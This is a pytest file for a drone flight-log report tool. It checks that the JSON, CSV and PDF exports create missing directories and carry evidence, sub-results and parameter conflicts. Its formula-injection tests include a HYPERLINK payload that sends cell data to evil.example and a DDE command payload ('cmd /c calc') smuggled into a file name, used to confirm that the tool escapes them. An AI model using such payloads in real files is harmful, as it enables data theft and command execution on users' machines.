"""JSON and CSV exports carry what the HTML report shows."""

from __future__ import annotations

import csv
import json
import sys
from types import SimpleNamespace
from unittest import mock

import pytest

import flight_report
from lib.i18n import set_locale, t
from lib.param_conflict import detect_param_conflicts
from lib.results import AnalysisResult
from tests.binlog import flight_log


@pytest.fixture(autouse=True)
def _restore_locale():
    yield
    set_locale("zh")


def _main(*argv: str) -> None:
    with mock.patch.object(sys, "argv", ["flight_report.py", *argv]):
        flight_report.main()


class TestOutputDirectory:
    """Only the HTML writer created its directory, so the other formats
    ended in a traceback after the whole analysis had run."""

    @pytest.mark.parametrize("fmt", ["json", "csv"])
    def test_export_creates_missing_directory(self, fmt, tmp_path):
        log = flight_log(duration_s=8.0).save(tmp_path / "flight.BIN")
        out = tmp_path / "new" / "dir" / f"report.{fmt}"
        assert not out.parent.exists()

        _main(log, "--format", fmt, "--only", "summary", "--no-open",
              "--no-fleet-record", "--no-ai", "-o", str(out))

        assert out.stat().st_size > 0

    def test_pdf_creates_missing_directory(self, tmp_path):
        log = flight_log(duration_s=8.0).save(tmp_path / "flight.BIN")
        out = tmp_path / "new" / "dir" / "report.pdf"
        assert not out.parent.exists()

        def fake_pdf(html_string, path):
            with open(path, "wb") as f:
                f.write(b"%PDF")

        with mock.patch("lib.pdf_export.html_to_pdf", fake_pdf), \
             mock.patch("plotly.io.to_image", return_value=b"\x89PNG"):
            _main(log, "--format", "pdf", "--only", "summary", "--no-open",
                  "--no-fleet-record", "--no-ai", "-o", str(out))

        assert out.read_bytes() == b"%PDF"


_VEHICLE = SimpleNamespace(vehicle_type="ArduCopter", board_name="CubeOrange",
                           firmware_version="V4.6.3", motor_count=4,
                           imu_count=2)
_READER = SimpleNamespace(params={}, errors=[],
                          get_flight_duration=lambda: 120.0)


def _pid_results() -> list[AnalysisResult]:
    """The shape pid_tuning emits, plus an analyzer that disagrees with it."""
    roll = {"param": "ATC_RAT_RLL_FLTD", "current": 40.0, "suggested": 28.0,
            "reason": "lower"}
    axis = AnalysisResult(title="Roll axis", status="critical",
                          summary="axis oscillates", details=["<b>rms</b> 9"],
                          param_suggestions=[dict(roll)])
    pid = AnalysisResult(title="PID", status="critical", summary="retune",
                         evidence_source="METHODIC 4.2",
                         action_text="run autotune", registry_key="pid_tuning",
                         param_suggestions=[dict(roll)], sub_results=[axis])
    notch = AnalysisResult(
        title="Notch", status="warning", summary="gyro filter",
        evidence_source="ArduPilot wiki", registry_key="notch_tuning",
        param_suggestions=[{**roll, "suggested": 20.0, "reason": "gyro/2"}])
    return [pid, notch]


class TestJson:
    """Evidence is required on every warning (invariant 1), and the axis
    findings and conflicts were in the HTML report only."""

    @pytest.fixture
    def data(self, tmp_path):
        results = _pid_results()
        conflicts = detect_param_conflicts(results)
        assert conflicts
        path = tmp_path / "out.json"
        flight_report.export_json(results, _VEHICLE, _READER, 49, str(path),
                                  conflicts)
        return json.loads(path.read_text(encoding="utf-8"))

    @pytest.mark.fast
    def test_evidence_and_action_are_exported(self, data):
        pid = data["analyzers"][0]
        assert pid["registry_key"] == "pid_tuning"
        assert pid["evidence_source"] == "METHODIC 4.2"
        assert pid["action_text"] == "run autotune"
        assert pid["failed"] is False

    @pytest.mark.fast
    def test_sub_results_are_exported(self, data):
        axis = data["analyzers"][0]["sub_results"][0]
        assert axis["title"] == "Roll axis"
        assert axis["status"] == "critical"
        assert axis["details"] == ["rms 9"]
        assert axis["param_suggestions"][0]["suggested"] == 28.0

    @pytest.mark.fast
    def test_conflicts_are_exported(self, data):
        assert [c["param"] for c in data["conflicts"]] == ["ATC_RAT_RLL_FLTD"]
        values = {e["value"] for e in data["conflicts"][0]["suggestions"]}
        assert values == {28.0, 20.0}


class TestCsv:
    @pytest.fixture
    def rows(self, tmp_path):
        results = _pid_results()
        conflicts = detect_param_conflicts(results)
        assert conflicts
        path = tmp_path / "out.csv"
        flight_report.export_csv(results, _VEHICLE, _READER, 49, str(path),
                                 conflicts)
        with open(path, encoding="utf-8-sig", newline="") as f:
            return list(csv.reader(f))

    @pytest.mark.fast
    def test_evidence_action_and_parameters_have_columns(self, rows):
        header = rows[0]
        pid = rows[1]
        assert pid[0] == "PID"
        assert pid[header.index(t("csv.col_evidence"))] == "METHODIC 4.2"
        assert pid[header.index(t("csv.col_action"))] == "apply_param"
        assert pid[header.index(t("csv.col_params"))] == \
            "ATC_RAT_RLL_FLTD=28.0"

    @pytest.mark.fast
    def test_sub_results_get_their_own_row(self, rows):
        axis = [r for r in rows if r and r[0] == "PID/Roll axis"]
        assert len(axis) == 1
        assert axis[0][1] == "critical"

    @pytest.mark.fast
    def test_conflicts_are_listed_with_every_value(self, rows):
        conflict = [r for r in rows if r and r[0] == t("csv.meta_conflict")]
        assert len(conflict) == 1
        assert conflict[0][1] == "ATC_RAT_RLL_FLTD"
        assert "28.0" in conflict[0][2] and "20.0" in conflict[0][2]


class TestCsvFormulas:
    """A firmware string or file name comes from the log, and a spreadsheet
    runs any cell starting with = + - @ as a formula."""

    HOSTILE = '=HYPERLINK("http://evil.example/?x="&A1,"click")'

    def _rows(self, path):
        with open(path, encoding="utf-8-sig", newline="") as f:
            return list(csv.reader(f))

    @pytest.mark.fast
    def test_single_log_csv(self, tmp_path):
        vehicle = SimpleNamespace(**{**vars(_VEHICLE),
                                     "firmware_version": self.HOSTILE,
                                     "board_name": "@SUM(A1:A9)"})
        result = AnalysisResult(title="Summary", status="good",
                                summary="-2+3")
        path = tmp_path / "out.csv"

        flight_report.export_csv([result], vehicle, _READER, 90, str(path), [])

        rows = self._rows(path)
        cells = [c for row in rows for c in row]
        assert "'" + self.HOSTILE in cells
        assert "'@SUM(A1:A9)" in cells
        assert "'-2+3" in cells
        assert self.HOSTILE not in cells

    @pytest.mark.fast
    def test_numbers_stay_numbers(self, tmp_path):
        reader = SimpleNamespace(params={}, errors=[],
                                 get_flight_duration=lambda: -1.0)
        path = tmp_path / "out.csv"

        flight_report.export_csv([], _VEHICLE, reader, -1, str(path), [])

        cells = [c for row in self._rows(path) for c in row]
        assert "-1.0" in cells
        assert "-1" in cells

    @pytest.mark.fast
    def test_batch_summary_csv(self, tmp_path):
        import batch_report
        row = {"filename": "=cmd|' /c calc'!A1.BIN", "vehicle_type": "+1+1",
               "firmware": self.HOSTILE, "board": "@x", "duration": 60.0,
               "health_score": 90, "n_warnings": 0, "n_criticals": 0,
               "elapsed": 1.0, "report_path": None, "metrics": {},
               "error": "=HYPERLINK(\"http://evil.example\")"}
        path = tmp_path / "batch.csv"

        batch_report.write_summary_csv([row], str(path))

        data = self._rows(path)[1]
        assert data[0] == "'=cmd|' /c calc'!A1.BIN"
        assert data[1] == "'+1+1"
        assert data[2] == "'" + self.HOSTILE
        assert data[3] == "'@x"
        assert data[-1].startswith("'=")
